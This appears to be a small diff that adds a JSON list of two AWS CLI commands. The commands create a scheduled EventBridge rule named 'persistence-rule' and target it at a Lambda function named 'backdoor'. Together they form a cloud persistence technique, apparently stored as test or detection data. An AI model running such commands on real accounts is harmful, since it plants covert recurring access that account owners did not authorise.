@@ -1,0 +1,4 @@
+[
+  "aws events put-rule --name persistence-rule --schedule-expression 'rate(5 minutes)' --state ENABLED",
+  "aws events put-targets --rule persistence-rule --targets 'Id=1,Arn=arn:aws:lambda:region:account:function:backdoor'"
+]
